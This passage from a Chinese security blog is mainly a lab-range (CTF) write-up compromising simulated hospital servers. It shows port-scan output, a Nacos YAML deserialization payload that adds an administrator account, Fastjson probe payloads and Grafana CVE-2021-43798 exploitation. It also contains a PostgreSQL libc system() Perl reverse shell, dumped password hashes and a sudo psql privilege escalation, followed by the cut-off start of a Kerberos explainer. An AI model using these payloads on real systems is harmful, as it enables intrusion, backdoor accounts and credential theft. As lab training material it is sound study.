title=\"内网\"></a>内网</h1><p>c段</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">172.30.12.6:139 open</span><br><span class=\"line\">172.30.12.6:135 open</span><br><span class=\"line\">172.30.12.236:22 open</span><br><span class=\"line\">172.30.12.5:22 open</span><br><span class=\"line\">172.30.12.6:8848 open</span><br><span class=\"line\">172.30.12.6:445 open</span><br><span class=\"line\">172.30.12.6:3389 open</span><br><span class=\"line\">172.30.12.236:8080 open</span><br><span class=\"line\">172.30.12.5:8080 open</span><br><span class=\"line\">172.30.12.236:8009 open</span><br><span class=\"line\">[*] NetBios: 172.30.12.6     WORKGROUP\\SERVER02             </span><br><span class=\"line\">[*] NetInfo:</span><br><span class=\"line\">[*]172.30.12.6</span><br><span class=\"line\">   [-&gt;]Server02</span><br><span class=\"line\">   [-&gt;]172.30.12.6</span><br><span class=\"line\">[*] WebTitle: http:&#x2F;&#x2F;172.30.12.5:8080   code:302 len:0      title:None 跳转url: http:&#x2F;&#x2F;172.30.12.5:8080&#x2F;login;jsessionid&#x3D;F6854EC4E799F8ECF72885829E57C524</span><br><span class=\"line\">[*] WebTitle: http:&#x2F;&#x2F;172.30.12.5:8080&#x2F;login;jsessionid&#x3D;F6854EC4E799F8ECF72885829E57C524 code:200 len:2005   title:医疗管理后台</span><br><span class=\"line\">[*] WebTitle: http:&#x2F;&#x2F;172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台</span><br><span class=\"line\">[*] WebTitle: http:&#x2F;&#x2F;172.30.12.6:8848   code:404 len:431    title:HTTP Status 404 – Not Found</span><br><span class=\"line\">[+] http:&#x2F;&#x2F;172.30.12.6:8848 poc-yaml-alibaba-nacos </span><br><span class=\"line\">[+] http:&#x2F;&#x2F;172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass </span><br><span class=\"line\">[+] http:&#x2F;&#x2F;172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file</span><br></pre></td></tr></table></figure>\n\n<p>挂上代理，172.30.12.6是台win开启3389，而且有权限绕过，nacos/nacos登录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">server:</span><br><span class=\"line\">  port: 8080</span><br><span class=\"line\">  servlet:</span><br><span class=\"line\">    context-path: &#x2F;hello</span><br><span class=\"line\"></span><br><span class=\"line\">spring:</span><br><span class=\"line\">  application:</span><br><span class=\"line\">    name: db-config</span><br><span class=\"line\">  cloud:</span><br><span class=\"line\">    nacos:</span><br><span class=\"line\">      discovery:</span><br><span class=\"line\">        server-addr: 127.0.0.1:8848</span><br><span class=\"line\">      config:</span><br><span class=\"line\">        server-addr: 127.0.0.1:8848</span><br><span class=\"line\">        file-extension: yaml</span><br><span class=\"line\">        namespace: dev</span><br><span class=\"line\">        group: DEFAULT_GROUP</span><br><span class=\"line\">        data-id: db-config.yaml</span><br><span class=\"line\">  datasource:</span><br><span class=\"line\">    mysql:</span><br><span class=\"line\">      url: jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;test?useSSL&#x3D;false&amp;serverTimezone&#x3D;UTC&amp;allowPublicKeyRetrieval&#x3D;true</span><br><span class=\"line\">      username: root</span><br><span class=\"line\">      password: P@ssWord!!!</span><br><span class=\"line\">  redis:</span><br><span class=\"line\">    host: localhost</span><br><span class=\"line\">    port: 6379</span><br><span class=\"line\"></span><br><span class=\"line\">management:</span><br><span class=\"line\">  endpoints:</span><br><span class=\"line\">    web:</span><br><span class=\"line\">      exposure:</span><br><span class=\"line\">        include: &#39;*&#39;</span><br></pre></td></tr></table></figure>\n\n<p>版本为1.4.1，当 Nacos-Client &lt; 1.4.2 时存在yaml反序列化漏洞，<a href=\"https://github.com/artsploit/yaml-payload\">https://github.com/artsploit/yaml-payload</a> 构造恶意jar包，反弹shell不出网，添加用户</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">public AwesomeScriptEngineFactory() throws java.io.IOException, InterruptedException &#123;</span><br><span class=\"line\">    try &#123;</span><br><span class=\"line\">        Runtime.getRuntime().exec(&quot;net user hacker Abc@123!@# &#x2F;add&quot;);</span><br><span class=\"line\">        Runtime.getRuntime().exec(&quot;net localgroup administrators hacker &#x2F;add&quot;);</span><br><span class=\"line\">    &#125; catch (IOException e) &#123;</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241130010740003.png\" alt=\"image-20241130010740003\"></p>\n<p>rdp或其他</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\Administrator\\flag</span><br><span class=\"line\">flag&#123;0f60d450-745d-481d-9497-a284680816bb&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Users\\hacker&gt;ipconfig &#x2F;all</span><br><span class=\"line\"></span><br><span class=\"line\">Windows IP 配置</span><br><span class=\"line\"></span><br><span class=\"line\">   主机名  . . . . . . . . . . . . . : Server02</span><br><span class=\"line\">   主 DNS 后缀 . . . . . . . . . . . :</span><br><span class=\"line\">   节点类型  . . . . . . . . . . . . : 混合</span><br><span class=\"line\">   IP 路由已启用 . . . . . . . . . . : 否</span><br><span class=\"line\">   WINS 代理已启用 . . . . . . . . . : 否</span><br><span class=\"line\"></span><br><span class=\"line\">以太网适配器 以太网:</span><br><span class=\"line\"></span><br><span class=\"line\">   连接特定的 DNS 后缀 . . . . . . . :</span><br><span class=\"line\">   描述. . . . . . . . . . . . . . . : Red Hat VirtIO Ethernet Adapter</span><br><span class=\"line\">   物理地址. . . . . . . . . . . . . : 00-16-3E-10-6D-91</span><br><span class=\"line\">   DHCP 已启用 . . . . . . . . . . . : 是</span><br><span class=\"line\">   自动配置已启用. . . . . . . . . . : 是</span><br><span class=\"line\">   本地链接 IPv6 地址. . . . . . . . : fe80::82ef:b679:6242:e236%6(首选)</span><br><span class=\"line\">   IPv4 地址 . . . . . . . . . . . . : 172.30.12.6(首选)</span><br><span class=\"line\">   子网掩码  . . . . . . . . . . . . : 255.255.0.0</span><br><span class=\"line\">   获得租约的时间  . . . . . . . . . : 2024年11月29日 23:32:08</span><br><span class=\"line\">   租约过期的时间  . . . . . . . . . : 2034年11月27日 23:32:09</span><br><span class=\"line\">   默认网关. . . . . . . . . . . . . : 172.30.255.253</span><br><span class=\"line\">   DHCP 服务器 . . . . . . . . . . . : 172.30.255.253</span><br><span class=\"line\">   DHCPv6 IAID . . . . . . . . . . . : 100668990</span><br><span class=\"line\">   DHCPv6 客户端 DUID  . . . . . . . : 00-01-00-01-2E-DB-96-D0-00-16-3E-10-6D-91</span><br><span class=\"line\">   DNS 服务器  . . . . . . . . . . . : 100.100.2.136</span><br><span class=\"line\">                                       100.100.2.138</span><br><span class=\"line\">   TCPIP 上的 NetBIOS  . . . . . . . : 已启用</span><br></pre></td></tr></table></figure>\n\n<p>没有其他网卡，结束windows，转向 172.30.12.236，fastjson</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241130011214776.png\" alt=\"image-20241130011214776\"></p>\n<p>照着打：<a href=\"https://github.com/safe6Sec/Fastjson\">https://github.com/safe6Sec/Fastjson</a>   、 <a href=\"https://github.com/CnHack3r/FastJsonParty_Training/blob/main/Fastjson%E5%85%A8%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8-Poc.md\">Fastjson全版本检测及利用-Poc</a></p>\n<p>v1.2.45 且 出网</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">版本：</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;</span><br><span class=\"line\">  </span><br><span class=\"line\">出网：</span><br><span class=\"line\">fastjson &lt;1.2.43</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http:&#x2F;&#x2F;dnslog&quot;&#125;</span><br><span class=\"line\">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http:&#x2F;&#x2F;dnslog&quot;&#125;:&quot;x&quot;&#125;</span><br><span class=\"line\">fastjson &lt;1.2.48</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class=\"line\">fastjson &lt;1.2.68</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class=\"line\">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class=\"line\">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class=\"line\">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;http:&#x2F;&#x2F;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class=\"line\">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http:&#x2F;&#x2F;dnslog&quot;&#125;]</span><br><span class=\"line\">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http:&#x2F;&#x2F;dnslog&quot;&#125;</span><br><span class=\"line\">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class=\"line\">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http:&#x2F;&#x2F;dnslog&quot;&#125;:0</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241130011456177.png\" alt=\"image-20241130011456177\"></p>\n<p>直接打jdbc，不过JNDIExploit的memshell基本都是冰蝎，该bp插件可添加哥斯拉：<a href=\"https://github.com/amaz1ngday/fastjson-exp\">https://github.com/amaz1ngday/fastjson-exp</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241130012555221.png\" alt=\"image-20241130012555221\"></p>\n<p>/root/flag/flag03.txt</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#123;2ecc9ec2-db91-4ec1-b5bf-3f90ae61f717&#125;</span><br></pre></td></tr></table></figure>\n\n<p>发现另一个c段172.30.54.0/24，root</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F; &gt;id</span><br><span class=\"line\"></span><br><span class=\"line\">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class=\"line\">&#x2F; &gt;ifconfig</span><br><span class=\"line\"></span><br><span class=\"line\">eth0: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class=\"line\">        inet 172.30.12.236  netmask 255.255.0.0  broadcast 172.30.255.255</span><br><span class=\"line\">        inet6 fe80::216:3eff:fe0f:7cad  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class=\"line\">        ether 00:16:3e:0f:7c:ad  txqueuelen 1000  (Ethernet)</span><br><span class=\"line\">        RX packets 119451  bytes 155865406 (155.8 MB)</span><br><span class=\"line\">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 29994  bytes 9124595 (9.1 MB)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class=\"line\"></span><br><span class=\"line\">eth1: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class=\"line\">        inet 172.30.54.179  netmask 255.255.255.0  broadcast 172.30.54.255</span><br><span class=\"line\">        inet6 fe80::216:3eff:fe14:4c44  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class=\"line\">        ether 00:16:3e:14:4c:44  txqueuelen 1000  (Ethernet)</span><br><span class=\"line\">        RX packets 1330  bytes 55860 (55.8 KB)</span><br><span class=\"line\">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 1348  bytes 57256 (57.2 KB)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class=\"line\"></span><br><span class=\"line\">lo: flags&#x3D;73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class=\"line\">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class=\"line\">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class=\"line\">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class=\"line\">        RX packets 3229  bytes 273180 (273.1 KB)</span><br><span class=\"line\">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 3229  bytes 273180 (273.1 KB)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>\n\n<p>要注意的是虽然都是172.30但是不能互相ping通</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241130013721630.png\" alt=\"image-20241130013721630\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">tmp&#x2F;test2 &gt;.&#x2F;fscan -h 172.30.54.0&#x2F;24 -nobr -nopoc</span><br><span class=\"line\"></span><br><span class=\"line\">start infoscan</span><br><span class=\"line\">(icmp) Target 172.30.54.179   is alive</span><br><span class=\"line\">(icmp) Target 172.30.54.12    is alive</span><br><span class=\"line\">[*] Icmp alive hosts len is: 2</span><br><span class=\"line\">172.30.54.12:5432 open</span><br><span class=\"line\">172.30.54.12:3000 open</span><br><span class=\"line\">172.30.54.12:22 open</span><br><span class=\"line\">172.30.54.179:22 open</span><br><span class=\"line\">172.30.54.179:8080 open</span><br><span class=\"line\">172.30.54.179:8009 open</span><br><span class=\"line\">[*] alive ports len is: 6</span><br><span class=\"line\">start vulscan</span><br><span class=\"line\">[*] WebTitle: http:&#x2F;&#x2F;172.30.54.179:8080 code:200 len:3964   title:医院后台管理平台</span><br><span class=\"line\">[*] WebTitle: http:&#x2F;&#x2F;172.30.54.12:3000  code:302 len:29     title:None 跳转url: http:&#x2F;&#x2F;172.30.54.12:3000&#x2F;login</span><br><span class=\"line\">[*] WebTitle: http:&#x2F;&#x2F;172.30.54.12:3000&#x2F;login code:200 len:27909  title:Grafana</span><br><span class=\"line\">已完成 6&#x2F;6</span><br><span class=\"line\">[*] 扫描结束,耗时: 3.179360064s</span><br></pre></td></tr></table></figure>\n\n<p>发现另一台主机172.30.54.12， 需要搭建双层代理了</p>\n<p>admin节点在node1执行 <code>listen 7777</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241130014238045.png\" alt=\"image-20241130014238045\"></p>\n<p>二层主机执行 <code>nohup ./agent_linux_x64 -rhost 172.30.12.5 -rport 7777 &amp;</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241130014746896.png\" alt=\"image-20241130014746896\"></p>\n<p>172.30.54.12为Grafana和pgsql，利用 CVE-2021-43798 漏洞获取到数据库文件（/var/lib/grafana/grafana.db）以及存在解密密钥的配置文件（/etc/grafana/grafana.ini），然后进行解密，使用：<a href=\"https://github.com/A-D-Team/grafanaExp\">https://github.com/A-D-Team/grafanaExp</a></p>\n<p>获取到：<code>postgres:Postgres@123</code>，</p>\n<p>数据库中存在两个user</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">postgres&#x3D;# select usename, passwd from pg_shadow;</span><br><span class=\"line\"> usename  |               passwd</span><br><span class=\"line\">----------+-------------------------------------</span><br><span class=\"line\"> root     | md5da974531914a7c2c56df745574a5bd3a</span><br><span class=\"line\"> postgres | md5dd27d33705155fd675e498384ad3d2ea</span><br></pre></td></tr></table></figure>\n\n<p>数据库版本为8.1 直接加载so文件命令执行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6</span><br><span class=\"line\">&#x2F;lib&#x2F;libc.so.6</span><br><span class=\"line\">&#x2F;lib64&#x2F;libc.so.6</span><br><span class=\"line\">&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6</span><br><span class=\"line\">&#x2F;usr&#x2F;lib32&#x2F;libc.so.6</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241130021942277.png\" alt=\"image-20241130021942277\"></p>\n<p>反弹shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS &#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;, &#39;system&#39; LANGUAGE &#39;c&#39; STRICT;</span><br><span class=\"line\"></span><br><span class=\"line\">select system(&#39;perl -e \\&#39;use Socket;$i&#x3D;&quot;172.30.54.179&quot;;$p&#x3D;12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;\\&#39;&#39;);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241130025433169.png\" alt=\"image-20241130025433169\"></p>\n<p>suid也没有利用</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;su</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;staprun</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;umount</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;stapbpf</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;fusermount</span><br><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;mount</span><br><span class=\"line\">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class=\"line\">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class=\"line\">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br></pre></td></tr></table></figure>\n\n<p><strong>通过执行sudo -l 发现 psql</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">postgres@web04:&#x2F;usr&#x2F;local&#x2F;pgsql&#x2F;data$ sudo -l</span><br><span class=\"line\">sudo -l</span><br><span class=\"line\">Matching Defaults entries for postgres on web04:</span><br><span class=\"line\">    env_reset, mail_badpass,</span><br><span class=\"line\">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;bin</span><br><span class=\"line\"></span><br><span class=\"line\">User postgres may run the following commands on web04:</span><br><span class=\"line\">    (ALL) NOPASSWD: &#x2F;usr&#x2F;local&#x2F;postgresql&#x2F;bin&#x2F;psql</span><br></pre></td></tr></table></figure>\n\n<p>但是需要数据库root用户密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">postgres@web04:&#x2F;usr&#x2F;local&#x2F;pgsql&#x2F;data$ sudo &#x2F;usr&#x2F;local&#x2F;postgresql&#x2F;bin&#x2F;psql</span><br><span class=\"line\">sudo &#x2F;usr&#x2F;local&#x2F;postgresql&#x2F;bin&#x2F;psql</span><br><span class=\"line\">Password: 123456</span><br><span class=\"line\"></span><br><span class=\"line\">psql: FATAL:  password authentication failed for user &quot;root&quot;</span><br></pre></td></tr></table></figure>\n\n<p>可以直接改掉数据库root用户密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER USER root WITH PASSWORD &#39;123456&#39;;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241130030434211.png\" alt=\"image-20241130030434211\"></p>\n<p>然后就是提权执行shell了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">\\?</span><br><span class=\"line\">!&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241130030616333.png\" alt=\"image-20241130030616333\"></p>\n","categories":["云境靶场"]},{"title":"Kerberos Attacks - Kerberos协议简析","url":"/2025/06/11/Kerberos%E5%8D%8F%E8%AE%AE%E7%AE%80%E6%9E%90/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/logo.png\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"Kerberos\"><a href=\"#Kerberos\" class=\"headerlink\" title=\"Kerberos\"></a>Kerberos</h1><p>Kerberos 协议的开发始于麻省理工学院 (MIT) 的 雅典娜项目。该项目于 1983 年启动，旨在为学生和研究人员提供尖端计算资源，包括联网工作站、高速网络和协作软件工具。Kerberos v5于 1993 年发布，并于 2005 年更新以解决以前版本的问题。此版本添加了其他加密类型、跨领域身份验证和通用安全服务应用程序接口，从 Windows Server 2000 开始， Kerberos 取代了 Windows  NTLM 成为默认的身份验证协议；不过，Microsoft 仍然支持 NTLM 以实现向后兼容。</p>\n<h1 id=\"相关组成\"><a href=\"#相关组成\" class=\"headerlink\" title=\"相关组成\"></a>相关组成</h1><p><strong>Realm</strong>: A set of network nodes (hosts, workstations, VMs, servers, etc) that share a common Kerberos database. I like to think of it as all of those nodes plus the KDC (and associated database). This brings it in line with definitions I’ve given for similar concepts across the other <a href=\"https://medium.com/p/e60121874a61\">identity protocols</a>.</p>\n<p><strong>Principal:</strong> A unique identity to which Kerberos tickets can be assigned. This could be a client, a user, or a server providing a service. The Principal name in Kerberos v5 is of the form primary/instance@REALM. See <a href=\"http://web.mit.edu/KERBEROS/krb5-1.5/krb5-1.5.4/doc/krb5-user/What-is-a-Kerberos-Principal_003f.html\">here</a> for more information.</p>\n<p><strong>Hosts/Clients:</strong> A process, host, server, VM, or other network node that makes use of a network service (that understands Kerberos and is part of the same Realm or a trusted-Realm) on behalf of a user.</p>\n<p><strong>Server (sometimes called a Service Server — SS)</strong>: A particular Principal that provides a resource to network Clients. The server is, also, sometimes referred to as the Application Server.</p>\n<p><strong>Service:</strong> A resource provided to network clients. Typically, provided by more than one server.</p>\n<p><strong>Key Distribution Center (KDC):</strong> A network service that supplies tickets<br>and temporary session keys; or an instance of that service or the host on which it runs. The KDC services both initial ticket and ticket-granting ticket requests. It is composed of the Authentication Service and Ticket Granting Server (see below).</p>\n<p><strong>Authentication Server (AS):</strong> The KDC component that handles the initial request and issues a TGT. The AS is responsible for maintaining a database of principals (users and servers) and the associated secret keys.</p>\n<p><strong>Ticket-granting service (TGS)</strong>: A service that issues <a href=\"https://learn.microsoft.com/zh-cn/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_838d3fe1-e504-4442-93cc-75de14e6f569\">tickets</a> for admission to other services in its own domain or for admission to the ticket-granting service in another domain.</p>\n<p><strong>Ticket-granting ticket (TGT)</strong>: A special type of <a href=\"https://learn.microsoft.com/zh-cn/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_838d3fe1-e504-4442-93cc-75de14e6f569\">ticket</a> that can be used to obtain other <a href=\"https://learn.microsoft.com/zh-cn/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_838d3fe1-e504-4442-93cc-75de14e6f569\">tickets</a>. The TGT is obtained after the initial authentication in the <a href=\"https://learn.microsoft.com/zh-cn/openspecs/windows_protocols/ms-sfu/4a624fb5-a078-4d30-8ad1-e9ab71e0bc47#gt_1353e9be-47fd-4284-8e5e-3e82a2738fc9\">Authentication Service (AS) exchange</a>; thereafter, users do not need to present their credentials, but can use the TGT to obtain subsequent tickets.</p>\n<h1 id=\"认证流程图\"><a href=\"#认证流程图\" class=\"headerlink\" title=\"认证流程图\"></a>认证流程图</h1><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250115234731778.png\" alt=\"image-20250115234731778\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250115234750957.png\" alt=\"image-20250115234750957\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250115234827541.png\" alt=\"image-20250115234827541\"></p>\n<p>上图对应使用的加密密钥</p>\n<blockquote>\n<p>AS-REQ：用户 NTLM HASH<br>AS-REP：用户 NTLM HASH + Krbtgt账户 NTLM HASH<br>TGS-REQ：会话密钥 + Krbtgt账户 NTLM HASH<br>TGS-REP：服务账户的 NTLM HASH<br>AP-REQ：会话密钥 + 服务账户的 NTLM HASH</p>\n</blockquote>\n<p>大概流程为：</p>\n<ul>\n<li><p>AS_REQ：Client向KDC发起AS_REQ请求包，使用用户hash加密时间戳</p>\n</li>\n<li><p>AS_REP：KDC使用Client hash进行解密，如果结果正确就返回 <strong>用户hash加密的信息和krbtgt hash加密的TGT票据</strong>，TGT里面包含PAC,PAC包含Client的sid，Client所在的组</p>\n</li>\n<li><p>TGS_REQ：Client凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求</p>\n</li>\n<li><p>TGS_REP：KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务 hash加密 的ST票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回ST票据)</p>\n</li>\n<li><p>AP_REQ：Client拿着ST票据去请求服务</p>\n</li>\n<li><p>AP_REP：服务使用自己的hash解密ST票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限。对应 6-7-8</p>\n</li>\n</ul>\n<p>小结为：</p>\n<ul>\n<li>AS-REQ与AS-REP：认证服务（AS）交换</li>\n<li>TGS-REQ与TGS-REP：票证授予服务 (TGS) 交换</li>\n<li>AP-REQ、AP-REP：客户端/服务器 (AP) 交换</li>\n</ul>\n<h1 id=\"预认证\"><a href=\"#预认证\" class=\"headerlink\" title=\"预认证\"></a>预认证</h1><p>目的：防止重放攻击</p>\n<p>Windows 域要求在 KRB_AS_REQ 消息中提供 <strong>预身份验证数据</strong>，最简单的预身份验证形式称为 PA-ENC-TIMESTAMP，<strong>即使用Client的hash对YYYYMMDDHHmmssZ 形式的 时间戳进行加密</strong>，这样KDC 就知道该请求不是先前请求的重放。</p>\n<p>在 Active Directory 环境中，是否需要进行预身份验证由 <strong>是否开启 不需要预身份验证 选项</strong> 决定，该标志是每个用户帐户上的设置。默认情况下所有用户都需要进行预身份验证。当启用该选项时，会造成 <strong>AS-REP roasting</strong> 的攻击</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250116010805452.png\" alt=\"image-20250116010805452\"></p>\n<h1 id=\"特权属性证书-PAC\"><a href=\"#特权属性证书-PAC\" class=\"headerlink\" title=\"特权属性证书-PAC\"></a>特权属性证书-PAC</h1><p>Kerberos 协议不提供授权，<strong>微软为了访问控制而引进的一个扩展</strong>，特权属性证书 (PAC) 的创建是为了为 Kerberos 协议扩展提供授权数据，如果说Kerberos 解决了 <code>who am i</code> 的认证问题，那么PAC就是解决了 <code>What can I 